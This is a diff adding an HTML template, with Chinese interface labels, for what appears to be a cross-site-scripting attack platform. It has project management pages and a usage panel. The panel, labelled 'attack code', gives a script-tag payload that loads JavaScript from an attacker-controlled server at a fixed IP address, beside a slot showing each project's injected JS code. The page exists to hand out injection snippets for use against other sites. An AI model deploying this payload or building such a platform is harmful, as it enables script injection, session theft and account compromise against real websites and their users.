@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>{{ title }}</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="{{ url_for('static',filename='css/bootstrap.min.css') }}">
+<link rel="stylesheet" href="{{ url_for('static',filename='css/bootstrap-theme.min.css') }}">
+<link rel="stylesheet" href="{{ url_for('static',filename='css/css.css') }}">
+</head>
+<body>
+<div class="navbar navbar-fixed-top navbar-inverse">
+   <div class="container">
+        <div class="collapse navbar-collapse">
+          <ul class="nav navbar-nav">
+            <li><a href="/home">主页</a></li>
+		  <li class="active"><a href="/project">项目配置</a></li>
+          </ul>
+          <ul class="nav navbar-nav navbar-right ng-scope" ng-controller="user_ctrl" id="header_me">
+        <li>
+        <a href="#" wt-tracker="Header|Menu|Goto Apply" style="font-weight: bold; color: white;">账号 : {{ username }}</a>
+        </li>
+
+
+                <iframe id="tmp_downloadhelper_iframe" style="display: none;"></iframe></li>
+                <li>
+                    <a href="/user" wt-tracker="Header|Menu|Goto Apply">个人设置</a>
+                </li>
+                <li>
+                    <a href="/auth/logout" wt-tracker="Header|Menu|Goto Apply">退出登陆</a>
+                </li>
+            </ul>
+			        </div><!--/.nav-collapse -->
+      <iframe  style="display: none;"></iframe></div>
+    </div><div class="container">
+    <div class="col-sm-3">
+	<div class="panel panel-default">
+		<div class="panel-heading">我的项目<a style="font-size:16px;float:right;" href="/project/create">创建项目</a>
+		</div>
+			<div class="panel-body">
+
+                {% for datas in data_js %}
+                    <ul class="nav nav-stacked">
+                <li><a href="/js/cat/{{ datas.id }}">{{ datas.name }}</a></li>
+                         </ul>
+                {% endfor %}
+
+            </div>
+	</div>
+    </div>
+
+    <div class="col-sm-9">
+          <div class="panel panel-default">
+    	<div class="panel-heading">项目名称: {{ name }}</div>
+		<div style="padding: 10px 15px;">
+<caption><h3>使用方法：</h3> </caption>
+<br>
+<h4><p style="color:red">攻击代码</p></h4><br>
+<pre>
+&lt;script src="http://192.168.2.12:8080/js/id/{{ id }}"&gt;&lt;/script&gt;
+</pre><br>
+<h4><p style="color:red">JS代码</p></h4><br>
+<pre>
+{{ js_code }}
+</pre>
+</div>
+</div>
+</div>
+
+</body>
+</html>
